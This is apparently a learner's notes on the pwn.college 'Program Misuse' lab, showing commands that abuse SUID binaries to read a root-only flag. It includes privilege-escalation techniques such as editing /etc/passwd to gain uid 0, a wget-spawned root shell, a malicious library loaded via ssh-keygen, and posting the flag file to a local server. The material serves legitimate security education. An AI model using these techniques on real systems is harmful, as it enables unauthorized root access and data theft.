##### Privilege Escalation
TBH I don't understand what he said to the core. I understand that there are programs with elevated privileges. But I don't understand Linux close to what he described. Maybe I should have taken the Linux luminarium first.

##### Mitigation
Explains how to try to prevent such misuse. Mainly Least-Privilege.

##### cat
yeah

##### more
yes

##### less, tail, head, sort
yep

##### vim, emacs, nano
vim is a text editor, from what I know. vim /flag
opened the flag in vim
Same with the others

##### rev
reverses the flag. I will make a file with the reversed data and rev it.
```
hacker@program-misuse~rev:~$ touch rev.txt
hacker@program-misuse~rev:~$ nano rev.txt 
Error in /etc/nanorc on line 156: Unknown option: suspend
hacker@program-misuse~rev:~$ nano rev.txt 
Error in /etc/nanorc on line 156: Unknown option: suspend
hacker@program-misuse~rev:~$ cat rev.txt 
}WzE3NDQ3MSwxNTJd.2vqNroQHTcuXptL9OnLFwM5YCqE{egelloc.nwp
hacker@program-misuse~rev:~$ rev ./rev.txt
```

##### od
```
hacker@program-misuse~od:~$ od -An -c /flag
   p   w   n   .   c   o   l   l   e   g   e   {   w   Y   8   0
   H   V   P   j   2   2   _   u   v   4   P   S   n   a   9   I
   j   G   w   C   B   c   j   .   d   N   T   N   x   w   S   M
   3   Q   D   N   3   E   z   W   }  \n
```
tr is only available to root.
I will use an online tool ig.

##### hd
hex dump
hex /flag
Thanks to google:
```
hd /flag | awk -F'|' '{printf "%s", $2}' | tr -d '\n'
```

##### xxd
```
hacker@program-misuse~xxd:~$ xxd /flag
00000000: 7077 6e2e 636f 6c6c 6567 657b 772d 6b43  pwn.college{w-kC
00000010: 4977 7963 4e68 754d 3662 6258 5150 374b  IwycNhuM6bbXQP7K
00000020: 4c56 5071 6b67 4f2e 6456 544e 7877 534d  LVPqkgO.dVTNxwSM
00000030: 3351 444e 3345 7a57 7d0a                 3QDN3EzW}.
hacker@program-misuse~xxd:~$ cd Program_Misuse/
hacker@program-misuse~xxd:~/Program_Misuse$ touch xxd.txt
hacker@program-misuse~xxd:~/Program_Misuse$ nano xxd.txt 
Error in /etc/nanorc on line 156: Unknown option: suspend
hacker@program-misuse~xxd:~/Program_Misuse$ xxd -r xxd.txt 
```

##### base32
Probably what it says
```
hacker@program-misuse~base32:~$ cd Program_Misuse/
hacker@program-misuse~base32:~/Program_Misuse$ base32 /flag >> base32.txt
hacker@program-misuse~base32:~/Program_Misuse$ cat base32.txt 
OB3W4LTDN5WGYZLHMV5WO3JSNJDGS4BTJ44E6QSKINRDE4JSJBAXQ3TNNM2XK2BOMRNFITTYO5JU
2M2RIRHDGRL2K56QU===
hacker@program-misuse~base32:~/Program_Misuse$ base32 -r base32.txt 
base32: invalid option -- 'r'
Try 'base32 --help' for more information.
hacker@program-misuse~base32:~/Program_Misuse$ man base32
No manual entry for base32
hacker@program-misuse~base32:~/Program_Misuse$ base32 -d base32.txt
```

##### base64
Probably the same
```
hacker@program-misuse~base64:~$ cd Program_Misuse/
hacker@program-misuse~base64:~/Program_Misuse$ base64 /flag >> base64.txt
hacker@program-misuse~base64:~/Program_Misuse$ cat base64.txt 
cHduLmNvbGxlZ2V7SXgxbXdmdkNNb0hUaWh4aTlCaVVIVzU2Zmo4LmRkVE54d1NNM1FETjNFeld9
Cg==
hacker@program-misuse~base64:~/Program_Misuse$ base64 -d base64.txt
```

##### split
```
hacker@program-misuse~split:~$ man split
hacker@program-misuse~split:~$ cd Program_Misuse/
hacker@program-misuse~split:~/Program_Misuse$ ls -l /bin/split
-rwsr-xr-x 1 root root 60184 Sep  5  2019 /bin/split
hacker@program-misuse~split:~/Program_Misuse$ split /flag
hacker@program-misuse~split:~/Program_Misuse$ ls 
base32.txt  base64.txt  od.txt  rev.txt  xaa  xxd.txt
hacker@program-misuse~split:~/Program_Misuse$ cat xaa
```

##### gzip
probably archiving and extracting formats. I did something similar in OverTheWire.
```
hacker@program-misuse~gzip:~$ cd Program_Misuse/
hacker@program-misuse~gzip:~/Program_Misuse$ ls -l /flag
-r-------- 1 root root 58 Sep 28 07:42 /flag
hacker@program-misuse~gzip:~/Program_Misuse$ gzip -k /flag
hacker@program-misuse~gzip:~/Program_Misuse$ ls
base32.txt  base64.txt  od.txt  rev.txt  xaa  xxd.txt
hacker@program-misuse~gzip:~/Program_Misuse$ gzip -k /flag > ./gzip.gz
gzip: /flag.gz already exists; do you wish to overwrite (y or n)? y
hacker@program-misuse~gzip:~/Program_Misuse$ ls
base32.txt  base64.txt  gzip.gz  od.txt  rev.txt  xaa  xxd.txt
hacker@program-misuse~gzip:~/Program_Misuse$ zcat gzip.gz 

gzip: gzip.gz: unexpected end of file
hacker@program-misuse~gzip:~/Program_Misuse$ gzip -dc gzip.gz 

gzip: gzip.gz: unexpected end of file
hacker@program-misuse~gzip:~/Program_Misuse$ cat /flag
cat: /flag: Permission denied
hacker@program-misuse~gzip:~/Program_Misuse$ rm gzip.gz 
hacker@program-misuse~gzip:~/Program_Misuse$ ls
base32.txt  base64.txt  od.txt  rev.txt  xaa  xxd.txt
hacker@program-misuse~gzip:~/Program_Misuse$ gzip -k /flag
gzip: /flag.gz already exists; do you wish to overwrite (y or n)? y
hacker@program-misuse~gzip:~/Program_Misuse$ ls
base32.txt  base64.txt  od.txt  rev.txt  xaa  xxd.txt
hacker@program-misuse~gzip:~/Program_Misuse$ gzip -dc /flag.gz
```

##### bzip2
```
hacker@program-misuse~bzip2:~$ cd Program_Misuse/
hacker@program-misuse~bzip2:~/Program_Misuse$ bzip2 -k
bzip2: I won't write compressed data to a terminal.
bzip2: For help, type: `bzip2 --help'.
hacker@program-misuse~bzip2:~/Program_Misuse$ man bzip2
No manual entry for bzip2
hacker@program-misuse~bzip2:~/Program_Misuse$ bzip2 -c -k /flag > bzip2.bz2
hacker@program-misuse~bzip2:~/Program_Misuse$ bzip2 -dc bzip2.bz2 
```

```
hacker@program-misuse~zip:~/Program_Misuse$ zip flag.zip /flag 
  adding: flag (stored 0%)
hacker@program-misuse~zip:~/Program_Misuse$ unzip -p flag.zip 
```

##### tar
```
hacker@program-misuse~tar:~$ cd Program_Misuse/
hacker@program-misuse~tar:~/Program_Misuse$ tar -cvf tar.tar /flag
tar: Removing leading `/' from member names
/flag
hacker@program-misuse~tar:~/Program_Misuse$ cat /flag
cat: /flag: Permission denied
hacker@program-misuse~tar:~/Program_Misuse$ tar -xp tar.tar 
tar: Refusing to read archive contents from terminal (missing -f option?)
tar: Error is not recoverable: exiting now
hacker@program-misuse~tar:~/Program_Misuse$ tar -xOf tar.tar 
```

##### ar
```
hacker@program-misuse~ar:~/Program_Misuse$ ar -r ar.r /flag
ar: creating ar.r
hacker@program-misuse~ar:~/Program_Misuse$ ar -x ar.r
hacker@program-misuse~ar:~/Program_Misuse$ ar -t ar.r 
flag
hacker@program-misuse~ar:~/Program_Misuse$ ar -p ar.r
```

##### cpio
So it gets a list of files through stinput, rather than arguments.
```
hacker@program-misuse~cpio:~$ cd Program_Misuse/
hacker@program-misuse~cpio:~/Program_Misuse$ cpio -o --quiet <<< "/flag" > archive.cpio
hacker@program-misuse~cpio:~/Program_Misuse$ cpio -i --to-stdout < archive.cpio
```
All hail Google. Reading man pages must suck. I am not going to waste a shit ton of time reading man pages if I can get the info I need faster.

I basically took the /flag file and fed it to the cpio, it expects output from piping. Then, take that archive and extract to stdout. simple as that.

##### genisoimage
.iso!!!
Making an archive did not work, this did.
```
hacker@program-misuse~genisoimage:~/Program_Misuse$ genisoimage -sort /flag -o flag.iso /etc/hosts
genisoimage: Incorrect sort file format
```
lesson: try to include the flag as config file, works sometimes

##### env
```
hacker@program-misuse~env:~$ env cat /flag
```
Too simple. It has root privilege, ofc it can cat it.

##### find
tbh I have no idea why this command worked. It was from stack exchange.
```
hacker@program-misuse~find:~$ find /flag -exec cat {\} \;
```

##### make
```
hacker@program-misuse~make:~/Program_Misuse$ nano Makefile 
Error in /etc/nanorc on line 156: Unknown option: suspend
hacker@program-misuse~make:~/Program_Misuse$ make run
cat /flag
```

##### nice
```
hacker@program-misuse~nice:~$ nice -n 10 cat /flag
```

##### timeout
```
hacker@program-misuse~timeout:~$ timeout 1 cat /flag
```

##### stdbuf
```
hacker@program-misuse~stdbuf:~$ stdbuf -o0  cat /flag
```

##### setarch
set architecture. dont care give flag
```
hacker@program-misuse~setarch:~$ setarch i686 cat /flag
```

##### watch
*The '***watch'*** command in Linux is a powerful utility that allows you to execute a command periodically, displaying its output in fullscreen mode. It is particularly useful for monitoring the output of commands that change over time, such as system resource usage or server status. By default, '***watch'*** runs the specified command every 2 seconds, continuously updating the display until interrupted.*

ok

```
hacker@program-misuse~watch:~$ watch -x cat /flag
```

##### socat
this is a program for streaming data through it. way to complex when I need to go to sleep.
BYE FOR NOW!
```
socat STDIO OPEN:/flag
```
Is searching on Google cheating?

##### whiptail
[How to use whiptail to create more user-friendly interactive scripts](https://www.redhat.com/en/blog/use-whiptail)

```
hacker@program-misuse~whiptail:~/Program_Misuse$ whiptail --textbox /flag 40 80
```

##### awk
```
hacker@program-misuse~awk:~$ awk '{print}' /flag
```
Very easy. The program is built to display contents of text!

##### sed
```
hacker@program-misuse~sed:~$ sed 's/foo/bar/' /flag
```

##### ed
```
hacker@program-misuse~ed:~$ ed /flag
58
,p
```

##### chown
```
hacker@program-misuse~chown:~$ chown hacker /flag
hacker@program-misuse~chown:~$ chown hacker /bin/cat
hacker@program-misuse~chown:~$ cat /flag
```

##### chmod
```
hacker@program-misuse~chmod:~$ chmod 755 /flag
hacker@program-misuse~chmod:~$ cat /flag
```

##### cp
```
hacker@program-misuse~cp:~/Program_Misuse$ touch flagio
hacker@program-misuse~cp:~/Program_Misuse$ cp /flag flagio
hacker@program-misuse~cp:~/Program_Misuse$ cat flagio
```

##### mv
***NOTE:** It might be helpful to take a step back and think about the broader environment you are in, and what that makes possible.*
That is interesting. Just moving a file won't change its permissions.
hm.
Maybe the challenge is not moving the flag, but moving something else? A program?
YES?
[The Dark Side of `mv` Command. mv, short for MOVE has been one of the… | by Nikhil Jagtap | WorkIndia.in | Medium](https://medium.com/workindia-in/the-dark-side-of-mv-command-3419c1bd619)
Well... no. mv doesn't stay SUID in my case.
Walkthrough time. I spent the whole day on this.

```
sed "s/1000:1000/0:0/" /etc/passwd > tmp # replaces our uid with root
1$ mv tmp /etc/passwd
# create a new session, through ssh for example
2$ cat /flag
```
It didnt work. I have no idea.

##### perl
```
perl -e 'open(my $fh, "<", "/flag"); print <$fh>;'

```

##### python
```
hacker@program-misuse~python:~/Program_Misuse$ cat python.py 
with open('/flag', 'r') as file:
    print(file.read())
hacker@program-misuse~python:~/Program_Misuse$ python python.py
```

##### ruby
```
hacker@program-misuse~ruby:~$ echo 'puts File.read("/flag")' > /tmp/solve.rb
hacker@program-misuse~ruby:~$ mov /tmp/solve.rb Program_Misuse/
bash: mov: command not found
hacker@program-misuse~ruby:~$ mv /tmp/solve.rb Program_Misuse/
hacker@program-misuse~ruby:~$ cd Program_Misuse/
hacker@program-misuse~ruby:~/Program_Misuse$ ruby solve.rb
```

##### bash
```
hacker@program-misuse~bash:~/Program_Misuse$ which bash
/run/challenge/bin/bash
hacker@program-misuse~bash:~/Program_Misuse$ /run/challenge/bin/bash -p -c 'cat /flag'
```

p = Preserve Privilege

##### date
```
hacker@program-misuse~date:~$ date --file=/flag
```

##### dmesg
It goes without saying that for each command I searched on it. Man pages, not a lot, mostly blogs.
[dmesg command in Linux for driver messages - GeeksforGeeks](https://www.geeksforgeeks.org/linux-unix/dmesg-command-linux-driver-messages/)

it has -F option, which reads from file. probably the same trick as the previous challenge.
```
hacker@program-misuse~dmesg:~$ dmesg -F /flag
```

##### wc
It only counts words! For now.
[wc command in Linux with examples - GeeksforGeeks](https://www.geeksforgeeks.org/linux-unix/wc-command-linux-examples/)
So, as far as I found, it doesn't seem like there is a way for wc to print the contents to stdout. I thought about using wc as an oracle but I don't think its possible. It only counts the number of letters, and I cant slice the /flag to check it.
Meh.
I have no clue! I thought about it the whole day.
it was so simple...
```
hacker@program-misuse~wc:~$ wc --files0-from /flag
```
##### gcc
```
gcc -x c -E /flag
```
Read it as C file and stop after reading.

##### as
as -o ......
I just did
```
as /flag
```
yep.

I understand that it's very dangerous to leave commands with SUID.

##### wget
Maybe ill create a server and get the flag contents? I am not sure this is the right approach.
YES

server:
```
from flask import Flask, request

  

app = Flask(__name__)

  

@app.route('/', methods=['POST', 'GET'])

def leak():

    body = request.get_data(as_text=True)

    print(f"[{body}]")

    print("===============================\n")

    return f"{body}"

  

if __name__ == '__main__':

    app.run(host='0.0.0.0', port=5000)
```

terminal:
```
wget --post-file=/flag http://127.0.0.1:5000/
```
flag in the server log

There is another, probably more right solution.

you can create a root shell with wget.
```
hacker@program-misuse~wget:~$ tmp=$(mktemp)
hacker@program-misuse~wget:~$ chmod +x $tmp
hacker@program-misuse~wget:~$ echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' > $tmp
hacker@program-misuse~wget:~$ wget --use-askpass=$tmp 0
# cat /flag
```

##### ssh-keygen
```
hacker@program-misuse~ssh-keygen:~/Program_Misuse$ gcc -shared -fPIC -o lib.so ssh-keygen.c 
hacker@program-misuse~ssh-keygen:~/Program_Misuse$ ssh-keygen -D lib.so
dlopen lib.so failed: lib.so: cannot open shared object file: No such file or directory
cannot read public key from pkcs11
hacker@program-misuse~ssh-keygen:~/Program_Misuse$ ssh-keygen -D ./lib.so
```

pkcs11.h must be present. 

C code:
```
#include <stdio.h>

  

void C_GetFunctionList()

{

    FILE *fd;

  

    char filename[] = "/flag";

    char c = 0;

  

    fd = fopen(filename, "r");

  

    while ((c = fgetc(fd)) != EOF)

        printf ("%c", c);

  

    fclose(fd);

}
```

Found it online. I am not a mastermind, but I bet searching online is a great skill. I don't have to invent the wheel.

FINISHED!